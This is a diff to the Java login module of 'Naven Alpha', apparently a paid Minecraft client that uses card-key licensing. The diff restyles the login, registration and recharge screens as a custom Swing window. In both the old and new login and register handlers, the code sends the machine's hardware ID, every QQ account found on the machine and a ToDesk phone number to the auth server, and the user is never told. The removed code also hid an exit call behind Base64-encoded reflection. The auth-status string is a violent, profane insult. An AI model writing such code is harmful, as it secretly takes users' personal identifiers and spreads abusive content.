@@ -15,6 +15,13 @@ import verify.client.IRCTransport;
 
 import javax.swing.*;
 import java.awt.*;
+import java.awt.event.FocusEvent;
+import java.awt.event.FocusListener;
+import java.awt.event.MouseAdapter;
+import java.awt.event.MouseEvent;
+import java.awt.event.ComponentAdapter;
+import java.awt.event.ComponentEvent;
+import java.awt.geom.RoundRectangle2D;
 import java.io.IOException;
 import java.lang.reflect.Method;
 import java.security.MessageDigest;
@@ -87,8 +94,10 @@ public class AuthUtils {
                         DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");
 
                         String formattedDate = date.format(formatter);
-                        showTopMessage("登录成功\n到期时间: " + formattedDate);
+                        String ircName = getIrcUsername();
+                        showTopMessage("登录成功\nIRC用户: " + ircName + "\n到期时间: " + formattedDate);
                         setAuthStatus("8964破解全家死光亲妈猪逼被操烂亲爹没鸡巴生小孩没屁眼操你血妈");
+                        AuthFrame.close();
                         Naven.b(null);
                     } else {
                         if (nowTimeWindow != timeWindow) message = "请尝试重新登陆或校准系统时间";
@@ -110,8 +119,10 @@ public class AuthUtils {
                         DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");
 
                         String formattedDate = date.format(formatter);
-                        showTopMessage("注册成功\n到期时间: " + formattedDate);
+                        String ircName = getIrcUsername();
+                        showTopMessage("注册成功\nIRC用户: " + ircName + "\n到期时间: " + formattedDate);
                         setAuthStatus("8964破解全家死光亲妈猪逼被操烂亲爹没鸡巴生小孩没屁眼操你血妈");
+                        AuthFrame.close();
                         Naven.b(null);
                     } else {
                         LocalDateTime date = LocalDateTime.ofInstant(
@@ -124,7 +135,8 @@ public class AuthUtils {
                         String formattedDate = date.format(formatter);
                         Naven.b(null);
                         if (nowTimeWindow != timeWindow) {
-                            showTopMessage("注册成功, 请重启客户端\n到期时间: " + formattedDate);
+                            String ircName = getIrcUsername();
+                            showTopMessage("注册成功, 请重启客户端\nIRC用户: " + ircName + "\n到期时间: " + formattedDate);
                             setAuthStatus("验证成功");
                         } else {
                             showTopMessage("注册失败\n" + message);
@@ -144,7 +156,8 @@ public class AuthUtils {
                         DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");
 
                         String formattedDate = date.format(formatter);
-                        showTopMessage("充值成功\n到期时间: " + formattedDate);
+                        String ircName = getIrcUsername();
+                        showTopMessage("充值成功\nIRC用户: " + ircName + "\n到期时间: " + formattedDate);
                     } else {
                         showTopMessage("充值失败\n" + message);
                         showRechargeDialog();
@@ -215,10 +228,31 @@ public class AuthUtils {
     }
 
     private static void showTopMessage(String message) {
-        JDialog dialog = new JDialog();
-        dialog.setAlwaysOnTop(true);
-        JOptionPane.showMessageDialog(dialog, message);
-        dialog.dispose();
+        String[] lines = message.split("\\n", -1);
+        String title = lines.length > 0 ? lines[0] : "提示";
+        String[] body = lines.length > 1 ? java.util.Arrays.copyOfRange(lines, 1, lines.length) : new String[0];
+        AuthFrame.showStyledMessage(title, body);
+    }
+
+    private static String getIrcUsername() {
+        String ircName = null;
+        try {
+            if (transport != null) {
+                Minecraft mc = Minecraft.getInstance();
+                String ign = mc.player == null ? mc.getUser().getName() : mc.player.getName().getString();
+                if (ign != null && !ign.isEmpty()) {
+                    ircName = transport.getName(ign);
+                }
+            }
+        } catch (Exception ignored) {
+        }
+        if (ircName == null || ircName.isBlank()) {
+            ircName = currentUser.get();
+        }
+        if (ircName == null || ircName.isBlank()) {
+            ircName = "未知";
+        }
+        return ircName;
     }
 
     private static Entity setAuthStatus(String status) {
@@ -242,130 +276,633 @@ public class AuthUtils {
         return Minecraft.getInstance().player;
     }
 
-    private static void close(Component c) {
-        javax.swing.SwingUtilities.getWindowAncestor(c).dispose();
-    }
-
     public static void showRegisterDialog() {
-        try {
-            JTextField usernameField = new JTextField();
-            JPasswordField passwordField = new JPasswordField();
-            JTextField cardKeyField = new JTextField();
-
-            JButton toLogin = new JButton("已有账号？去登录");
-            toLogin.addActionListener(e -> {
-                close(toLogin);
-                showLoginDialog();
-            });
-
-            Object[] message = {
-                    "用户名:", usernameField,
-                    "密码:", passwordField,
-                    "卡密", cardKeyField,
-                    toLogin
-            };
-
-            JDialog dialog = new JDialog();
-            dialog.setAlwaysOnTop(true);
-            int option = JOptionPane.showConfirmDialog(dialog, message, "用户注册", JOptionPane.OK_CANCEL_OPTION);
-            dialog.dispose();
-
-            if (option == JOptionPane.OK_OPTION) {
-                String user = usernameField.getText();
-                String pass = new String(passwordField.getPassword());
-                String card = cardKeyField.getText();
-                currentUser.set(user);
-                transport.register(user, pass, getHWID(), QQUtils.getAllQQ(), TodeskUtils.getPhone(), card);
-            }
-        } catch (IOException e) {
-            e.printStackTrace();
-            showTopMessage("验证失败: " + e.getMessage());
-
-            try {
-                Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
-                Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
-                exit.invoke(null, 0);
-            } catch (Exception ex) {
-            }
-        }
+        AuthFrame.show(AuthFrame.Page.REGISTER);
     }
 
     public static void showLoginDialog() {
-        try {
-            JTextField usernameField = new JTextField();
-            JPasswordField passwordField = new JPasswordField();
-
-            JButton toReg = new JButton("没有账号？去注册");
-            JButton toRec = new JButton("去充值");
-            toReg.addActionListener(e -> {
-                close(toReg);
-                showRegisterDialog();
-            });
-            toRec.addActionListener(e -> {
-                close(toRec);
-                showRechargeDialog();
-            });
-
-            JPanel nav = new JPanel();
-            nav.add(toReg);
-            nav.add(toRec);
-
-            Object[] message = {
-                    "用户名:", usernameField,
-                    "密码:", passwordField,
-                    nav
-            };
-
-            JDialog dialog = new JDialog();
-            dialog.setAlwaysOnTop(true);
-            int option = JOptionPane.showConfirmDialog(dialog, message, "用户登录", JOptionPane.OK_CANCEL_OPTION);
-            dialog.dispose();
-
-            if (option == JOptionPane.OK_OPTION) {
-                String user = usernameField.getText();
-                String pass = new String(passwordField.getPassword());
-                currentUser.set(user);
-                transport.login(user, pass, getHWID(), QQUtils.getAllQQ(), TodeskUtils.getPhone());
-            }
-        } catch (IOException e) {
-            e.printStackTrace();
-            showTopMessage("验证失败: " + e.getMessage());
-
-            try {
-                Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
-                Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
-                exit.invoke(null, 0);
-            } catch (Exception ex) {
-            }
-        }
+        AuthFrame.show(AuthFrame.Page.LOGIN);
     }
 
     public static void showRechargeDialog() {
-        JTextField usernameField = new JTextField();
-        JTextField cardKeyField = new JTextField();
+        AuthFrame.show(AuthFrame.Page.CHARGE);
+    }
 
-        JButton toLogin = new JButton("返回登录");
-        toLogin.addActionListener(e -> {
-            close(toLogin);
-            showLoginDialog();
-        });
+    private static class AuthFrame {
+        private static Font hm;
+        private static final Color opaque = new Color(0, true);
+        private static final Color backgroundColor = new Color(0xff1a1417);
+        private static Frame frame;
 
-        Object[] message = {
-                "用户名:", usernameField,
-                "卡密:", cardKeyField,
-                toLogin
-        };
+        static {
+            try {
+                java.io.InputStream stream = AuthUtils.class.getResourceAsStream("/assets/heypixel/VcX6svVqmeT8/fonts/MiSans-Regular.ttf");
+                if (stream != null) {
+                    hm = Font.createFont(Font.PLAIN, stream);
+                } else {
+                    hm = new Font("Arial", Font.PLAIN, 12);
+                }
+            } catch (FontFormatException | IOException e) {
+                hm = new Font("Arial", Font.PLAIN, 12);
+            }
+        }
 
-        JDialog dialog = new JDialog();
-        dialog.setAlwaysOnTop(true);
-        int option = JOptionPane.showConfirmDialog(dialog, message, "充值", JOptionPane.OK_CANCEL_OPTION);
-        dialog.dispose();
+        private enum Page {
+            LOGIN,
+            REGISTER,
+            CHARGE
+        }
 
-        if (option == JOptionPane.OK_OPTION) {
-            String user = usernameField.getText();
-            String card = cardKeyField.getText();
+        private static void show(Page page) {
+            if (frame == null || !frame.isDisplayable()) {
+                frame = new Frame();
+            }
+            frame.setPage(page);
+            frame.setVisible(true);
+            frame.toFront();
+        }
 
-            transport.recharge(user, card);
+        private static void close() {
+            if (frame == null) {
+                return;
+            }
+            frame.setVisible(false);
+            frame.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
+            frame.dispose();
+            frame = null;
+        }
+
+        private static void showStyledMessage(String title, String[] lines) {
+            Frame msgFrame = new Frame();
+            msgFrame.setAlwaysOnTop(true);
+            Frame.ContentPanel.AbstractPage page = new Frame.ContentPanel.AbstractPage(title) {
+                @Override
+                protected void initPage() {
+                    int y = 48;
+                    for (String text : lines) {
+                        JLabel label = new JLabel(text);
+                        label.setLocation(2, y);
+                        label.setForeground(new Color(0xffcce5));
+                        label.setBackground(opaque);
+                        label.setSize(318, 28);
+                        label.setFont(hm.deriveFont(22f));
+                        this.add(label);
+                        y += 30;
+                    }
+                    Frame.Button ok = new Frame.Button("确定") {
+                        @Override
+                        protected void onClicked(MouseEvent e) {
+                            msgFrame.setVisible(false);
+                            msgFrame.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
+                            msgFrame.dispose();
+                        }
+                    };
+                    ok.setLocation(0, 178);
+                    this.add(ok);
+                }
+            };
+            msgFrame.showMessagePage(page);
+            msgFrame.setVisible(true);
+            msgFrame.toFront();
+        }
+
+        private static class Frame extends JFrame {
+            private final BackgroundPanel backgroundPanel;
+            private final ContentPanel contentPanel;
+
+            private Frame() {
+                super("Naven");
+                this.setUndecorated(true);
+                this.setBackground(backgroundColor);
+                this.setSize(388, 450);
+                this.setLocationRelativeTo(null);
+                backgroundPanel = new BackgroundPanel();
+                contentPanel = new ContentPanel();
+                backgroundPanel.add(new TitleBar(this));
+                backgroundPanel.add(contentPanel);
+                this.add(backgroundPanel);
+                updateShape();
+                this.addComponentListener(new ComponentAdapter() {
+                    @Override
+                    public void componentResized(ComponentEvent e) {
+                        updateShape();
+                    }
+                });
+            }
+
+            private void updateShape() {
+                this.setShape(new RoundRectangle2D.Double(0, 0, getWidth(), getHeight(), 48, 48));
+            }
+
+            private void setPage(Page page) {
+                contentPanel.setCurrentPage(page);
+            }
+
+            private void showMessagePage(ContentPanel.AbstractPage page) {
+                contentPanel.setCurrentPage(page);
+            }
+
+            private static class BackgroundPanel extends JPanel {
+                private BackgroundPanel() {
+                    this.setSize(388, 450);
+                    this.setLocation(0, 0);
+                    this.setLayout(null);
+                }
+
+                @Override
+                protected void paintComponent(Graphics g) {
+                    Graphics2D g2 = (Graphics2D) g.create();
+                    g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
+                    g2.setColor(backgroundColor);
+                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 48, 48);
+                    g2.dispose();
+                }
+            }
+
+            private static class TitleBar extends JPanel {
+                private static Point originPoint;
+
+                private TitleBar(Frame frame) {
+                    this.setBackground(opaque);
+                    this.setSize(388, 90);
+                    this.setLocation(0, 0);
+                    this.setLayout(null);
+                    JLabel label = new JLabel("Naven Alpha");
+                    label.setLocation(36, 0);
+                    label.setBackground(opaque);
+                    label.setForeground(new Color(0xffffcce5));
+                    label.setFont(hm.deriveFont(36f));
+                    label.setSize(320, 90);
+                    this.add(label);
+                    this.addMouseListener(new MouseAdapter() {
+                        @Override
+                        public void mousePressed(MouseEvent e) {
+                            originPoint = new Point(e.getPoint());
+                        }
+                    });
+                    this.addMouseMotionListener(new MouseAdapter() {
+                        @Override
+                        public void mouseDragged(MouseEvent e) {
+                            int x = e.getXOnScreen();
+                            int y = e.getYOnScreen();
+                            frame.setLocation(x - originPoint.x, y - originPoint.y);
+                        }
+                    });
+                }
+            }
+
+            private static class ContentPanel extends JPanel {
+                private AbstractPage currentPage;
+                private final Pages pages;
+
+                private ContentPanel() {
+                    this.setSize(388, 360);
+                    this.setLocation(0, 90);
+                    this.setLayout(null);
+                    this.setBackground(opaque);
+                    JLabel label = new JLabel("Designed by GZ_Sakura");
+                    label.setBackground(opaque);
+                    label.setForeground(new Color(0xff806673));
+                    label.setFont(hm.deriveFont(14f));
+                    label.setVerticalAlignment(SwingConstants.TOP);
+                    label.setSize(320, 20);
+                    label.setLocation(36, 320);
+                    this.add(label);
+                    pages = new Pages(this);
+                    currentPage = pages.PAGE_LOGIN;
+                    this.add(currentPage);
+                }
+
+                private void setCurrentPage(Page page) {
+                    AbstractPage target = switch (page) {
+                        case LOGIN -> pages.PAGE_LOGIN;
+                        case REGISTER -> pages.PAGE_REGISTER;
+                        case CHARGE -> pages.PAGE_CHARGE;
+                    };
+                    setCurrentPage(target);
+                }
+
+                private void setCurrentPage(AbstractPage page) {
+                    this.remove(currentPage);
+                    this.currentPage = page;
+                    this.add(currentPage);
+                    currentPage.repaint();
+                }
+
+                private static class Pages {
+                    private final AbstractPage PAGE_LOGIN;
+                    private final AbstractPage PAGE_REGISTER;
+                    private final AbstractPage PAGE_CHARGE;
+
+                    private Pages(ContentPanel parent) {
+                        PAGE_LOGIN = new AbstractPage("登录以继续") {
+                            @Override
+                            protected void initPage() {
+                                InputField username = new InputField("用户名");
+                                username.setLocation(0, 48);
+                                this.add(username);
+                                PassField password = new PassField("密码");
+                                password.setLocation(0, 108);
+                                this.add(password);
+                                TextButton charge = new TextButton("续费", 30, 18) {
+                                    @Override
+                                    protected void onClicked() {
+                                        parent.setCurrentPage(Page.CHARGE);
+                                    }
+                                };
+                                charge.setLocation(290, 185);
+                                this.add(charge);
+                                TextButton register = new TextButton("没有账户? 注册", 103, 18) {
+                                    @Override
+                                    protected void onClicked() {
+                                        parent.setCurrentPage(Page.REGISTER);
+                                    }
+                                };
+                                register.setLocation(217, 210);
+                                this.add(register);
+                                Button login = new Button("登录") {
+                                    @Override
+                                    protected void onClicked(MouseEvent e) {
+                                        String usernameStr = username.getText();
+                                        String passwordStr = password.getText();
+                                        if (usernameStr.isBlank() || usernameStr.equals(username.tip)) {
+                                            JOptionPane.showMessageDialog(null, "用户名不能为空");
+                                            setAllowPress(true);
+                                            return;
+                                        }
+                                        if (passwordStr.isBlank() || passwordStr.equals(password.tip)) {
+                                            JOptionPane.showMessageDialog(null, "密码不能为空");
+                                            setAllowPress(true);
+                                            return;
+                                        }
+                                        try {
+                                            transport.login(usernameStr, passwordStr, getHWID(), QQUtils.getAllQQ(), TodeskUtils.getPhone());
+                                            currentUser.set(usernameStr);
+                                        } catch (IOException ex) {
+                                            ex.printStackTrace();
+                                            JOptionPane.showMessageDialog(null, "验证失败: " + ex.getMessage());
+                                            System.exit(0);
+                                        }
+                                    }
+                                };
+                                login.setLocation(0, 178);
+                                this.add(login);
+                            }
+                        };
+                        PAGE_REGISTER = new AbstractPage("注册账户") {
+                            private String usernameStr = "";
+                            private String passwordStr = "";
+                            private final AbstractPage page2 = new AbstractPage("注册账户") {
+                                @Override
+                                protected void initPage() {
+                                    JLabel label = new JLabel() {
+                                        @Override
+                                        public void paint(Graphics g) {
+                                            setText("将注册为: " + usernameStr);
+                                            super.paint(g);
+                                        }
+                                    };
+                                    label.setLocation(2, 48);
+                                    label.setForeground(new Color(0xffcce5));
+                                    label.setBackground(opaque);
+                                    label.setSize(318, 50);
+                                    label.setFont(hm.deriveFont(22f));
+                                    this.add(label);
+                                    InputField key = new InputField("卡密");
+                                    key.setLocation(0, 108);
+                                    this.add(key);
+                                    Button next = new Button("注册") {
+                                        @Override
+                                        protected void onClicked(MouseEvent e) {
+                                            String keyStr = key.getText();
+                                            if (keyStr.isBlank() || keyStr.equals(key.tip)) {
+                                                JOptionPane.showMessageDialog(null, "卡密不能为空");
+                                                setAllowPress(true);
+                                                return;
+                                            }
+                                            try {
+                                                transport.register(usernameStr, passwordStr, getHWID(), QQUtils.getAllQQ(), TodeskUtils.getPhone(), keyStr);
+                                                currentUser.set(usernameStr);
+                                            } catch (IOException ex) {
+                                                JOptionPane.showMessageDialog(null, "验证失败: " + ex.getMessage());
+                                                System.exit(0);
+                                            }
+                                        }
+                                    };
+                                    next.setLocation(0, 178);
+                                    this.add(next);
+                                    TextButton back = new TextButton("上一步", 47, 18) {
+                                        @Override
+                                        protected void onClicked() {
+                                            parent.setCurrentPage(Page.REGISTER);
+                                        }
+                                    };
+                                    back.setLocation(273, 210);
+                                    this.add(back);
+                                }
+                            };
+
+                            @Override
+                            protected void initPage() {
+                                InputField username = new InputField("用户名");
+                                username.setLocation(0, 48);
+                                this.add(username);
+                                InputField password = new InputField("密码");
+                                password.setLocation(0, 108);
+                                this.add(password);
+                                TextButton backToLogin = new TextButton("返回登录", 0, 18) {
+                                    @Override
+                                    protected void onClicked() {
+                                        parent.setCurrentPage(Page.LOGIN);
+                                    }
+                                };
+                                backToLogin.setLocation(320 - backToLogin.getWidth(), 210);
+                                this.add(backToLogin);
+                                Button next = new Button("下一步", false) {
+                                    @Override
+                                    protected void onClicked(MouseEvent e) {
+                                        usernameStr = username.getText();
+                                        if (usernameStr.isBlank() || usernameStr.equals(username.tip)) {
+                                            JOptionPane.showMessageDialog(null, "用户名不能为空");
+                                            return;
+                                        }
+                                        passwordStr = password.getText();
+                                        if (passwordStr.isBlank() || passwordStr.equals(password.tip)) {
+                                            JOptionPane.showMessageDialog(null, "密码不能为空");
+                                            return;
+                                        }
+                                        parent.setCurrentPage(page2);
+                                    }
+                                };
+                                next.setLocation(0, 178);
+                                this.add(next);
+                            }
+                        };
+                        PAGE_CHARGE = new AbstractPage("为账户续费") {
+                            @Override
+                            protected void initPage() {
+                                InputField username = new InputField("用户名");
+                                username.setLocation(0, 48);
+                                this.add(username);
+                                InputField key = new InputField("卡密");
+                                key.setLocation(0, 108);
+                                this.add(key);
+                                TextButton backToLogin = new TextButton("返回登录", 0, 18) {
+                                    @Override
+                                    protected void onClicked() {
+                                        parent.setCurrentPage(Page.LOGIN);
+                                    }
+                                };
+                                backToLogin.setLocation(320 - backToLogin.getWidth(), 210);
+                                this.add(backToLogin);
+                                Button charge = new Button("续费") {
+                                    @Override
+                                    protected void onClicked(MouseEvent e) {
+                                        String usernameStr = username.getText();
+                                        if (usernameStr.isBlank() || usernameStr.equals(username.tip)) {
+                                            JOptionPane.showMessageDialog(null, "用户名不能为空");
+                                            setAllowPress(true);
+                                            return;
+                                        }
+                                        String keyStr = key.getText();
+                                        if (keyStr.isBlank() || keyStr.equals(key.tip)) {
+                                            JOptionPane.showMessageDialog(null, "卡密不能为空");
+                                            setAllowPress(true);
+                                            return;
+                                        }
+                                        transport.recharge(usernameStr, keyStr);
+                                    }
+                                };
+                                charge.setLocation(0, 178);
+                                this.add(charge);
+                            }
+                        };
+                    }
+                }
+
+                private abstract static class AbstractPage extends JPanel {
+                    private AbstractPage(String title) {
+                        this.setBackground(new Color(0xff1a1417));
+                        this.setSize(320, 228);
+                        this.setLocation(34, 24);
+                        this.setLayout(null);
+                        JLabel label = new JLabel(title);
+                        label.setSize(318, 28);
+                        label.setLocation(2, 0);
+                        label.setBackground(opaque);
+                        label.setForeground(new Color(0xffffcce5));
+                        label.setFont(hm.deriveFont(24f));
+                        this.add(label);
+                        initPage();
+                    }
+
+                    protected abstract void initPage();
+                }
+            }
+
+            private static class InputField extends JTextField implements FocusListener {
+                private final String tip;
+
+                private InputField(String tip) {
+                    this.tip = tip + "\r";
+                    this.setText(this.tip);
+                    this.setSize(320, 50);
+                    this.addFocusListener(this);
+                    this.setBorder(null);
+                    this.setFont(hm.deriveFont(22f));
+                    this.setForeground(new Color(0xff806673));
+                    this.setBackground(opaque);
+                    this.setOpaque(false);
+                    this.setMargin(new Insets(0, 18, 0, 0));
+                }
+
+                @Override
+                protected void paintComponent(Graphics g) {
+                    Graphics2D g2 = (Graphics2D) g.create();
+                    g2.setColor(new Color(0xff1a1417));
+                    g2.fillRect(0, 0, getWidth(), getHeight());
+                    g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
+                    g2.setColor(new Color(0xDFFCCE5, true));
+                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 16, 16);
+                    g2.dispose();
+                    super.paintComponent(g);
+                }
+
+                @Override
+                public void focusGained(FocusEvent e) {
+                    if (this.getText().equals(tip)) {
+                        setText("");
+                    }
+                    setForeground(new Color(0xffbf98ac));
+                }
+
+                @Override
+                public void focusLost(FocusEvent e) {
+                    if (this.getText().isEmpty()) {
+                        setText(tip);
+                    }
+                    if (this.getText().equals(tip)) {
+                        setForeground(new Color(0xff806673));
+                    }
+                }
+            }
+
+            private static class PassField extends JPasswordField implements FocusListener {
+                private final String tip;
+
+                private PassField(String tip) {
+                    this.tip = tip + "\r";
+                    this.setText(this.tip);
+                    this.setEchoChar((char) 0);
+                    this.setSize(320, 50);
+                    this.addFocusListener(this);
+                    this.setBorder(null);
+                    this.setFont(hm.deriveFont(22f));
+                    this.setForeground(new Color(0xff806673));
+                    this.setBackground(opaque);
+                    this.setOpaque(false);
+                    this.setMargin(new Insets(0, 18, 0, 0));
+                }
+
+                @Override
+                protected void paintComponent(Graphics g) {
+                    Graphics2D g2 = (Graphics2D) g.create();
+                    g2.setColor(new Color(0xff1a1417));
+                    g2.fillRect(0, 0, getWidth(), getHeight());
+                    g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
+                    g2.setColor(new Color(0xDFFCCE5, true));
+                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 16, 16);
+                    g2.dispose();
+                    super.paintComponent(g);
+                }
+
+                @Override
+                public void focusGained(FocusEvent e) {
+                    setEchoChar('*');
+                    if (this.getText().equals(tip)) {
+                        setText("");
+                    }
+                    setForeground(new Color(0xffbf98ac));
+                }
+
+                @Override
+                public void focusLost(FocusEvent e) {
+                    if (this.getText().isEmpty()) {
+                        setText(tip);
+                    }
+                    if (this.getText().equals(tip)) {
+                        setEchoChar((char) 0);
+                        setForeground(new Color(0xff806673));
+                    }
+                }
+            }
+
+            private abstract static class TextButton extends JPanel {
+                private TextButton(String text, int width, int height) {
+                    this.setLayout(null);
+                    this.setBackground(opaque);
+                    int resolvedWidth = width;
+                    if (resolvedWidth <= 0) {
+                        Graphics2D g2 = new java.awt.image.BufferedImage(1, 1, java.awt.image.BufferedImage.TYPE_INT_ARGB).createGraphics();
+                        g2.setFont(hm.deriveFont(15f));
+                        resolvedWidth = g2.getFontMetrics().stringWidth(text) + 6;
+                        g2.dispose();
+                    }
+                    this.setSize(resolvedWidth, height);
+                    JLabel label = new JLabel(text) {
+                        @Override
+                        protected void paintComponent(Graphics g) {
+                            super.paintComponent(g);
+                            g.setColor(new Color(0xffcce5));
+                            g.fillRect(0, getHeight() - 1, getWidth(), 1);
+                        }
+                    };
+                    label.setBackground(opaque);
+                    label.setForeground(new Color(0xffcce5));
+                    label.setLocation(0, 0);
+                    label.setSize(resolvedWidth, height);
+                    label.setFont(hm.deriveFont(15f));
+                    this.add(label);
+                    this.addMouseListener(new MouseAdapter() {
+                        @Override
+                        public void mouseClicked(MouseEvent e) {
+                            onClicked();
+                        }
+                    });
+                }
+
+                protected abstract void onClicked();
+            }
+
+            private static class Button extends JButton {
+                private boolean holding = false;
+                private boolean allowPress = true;
+
+                private Button(String text) {
+                    this(text, true);
+                }
+
+                private Button(String text, boolean cooldown) {
+                    super(text);
+                    this.setSize(160, 50);
+                    this.addMouseListener(new MouseAdapter() {
+                        @Override
+                        public void mouseEntered(MouseEvent e) {
+                            holding = true;
+                        }
+
+                        @Override
+                        public void mouseExited(MouseEvent e) {
+                            holding = false;
+                        }
+
+                        @Override
+                        public void mouseClicked(MouseEvent e) {
+                            if (!allowPress && cooldown) {
+                                return;
+                            }
+                            if (cooldown) {
+                                allowPress = false;
+                            }
+                            onClicked(e);
+                        }
+                    });
+                }
+
+                protected void onClicked(MouseEvent e) {
+                }
+
+                @Override
+                public void paint(Graphics g) {
+                    Graphics2D g2 = (Graphics2D) g.create();
+                    g2.setColor(new Color(0xff1a1417));
+                    g2.fillRect(0, 0, getWidth(), getHeight());
+                    g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
+                    g2.setColor(new Color(0xFFCCE5));
+                    g2.fillRoundRect(0, 0, getWidth(), getHeight(), 16, 16);
+                    if (!allowPress) {
+                        g2.setColor(new Color(0x33000000, true));
+                        g2.fillRoundRect(0, 0, getWidth(), getHeight(), 16, 16);
+                    } else if (holding) {
+                        g2.setColor(new Color(0x33FFFFFF, true));
+                        g2.fillRoundRect(0, 0, getWidth(), getHeight(), 16, 16);
+                    }
+                    g2.setFont(hm.deriveFont(24f));
+                    FontMetrics fm = g2.getFontMetrics();
+                    g2.setColor(new Color(0x994d73));
+                    String text = allowPress ? getText() : "...";
+                    g2.drawString(
+                            text,
+                            (getWidth() - fm.stringWidth(text)) / 2,
+                            (getHeight() - fm.getHeight()) / 2 + fm.getAscent()
+                    );
+                    g2.dispose();
+                }
+
+                public void setAllowPress(boolean allowPress) {
+                    this.allowPress = allowPress;
+                }
+            }
         }
     }
 
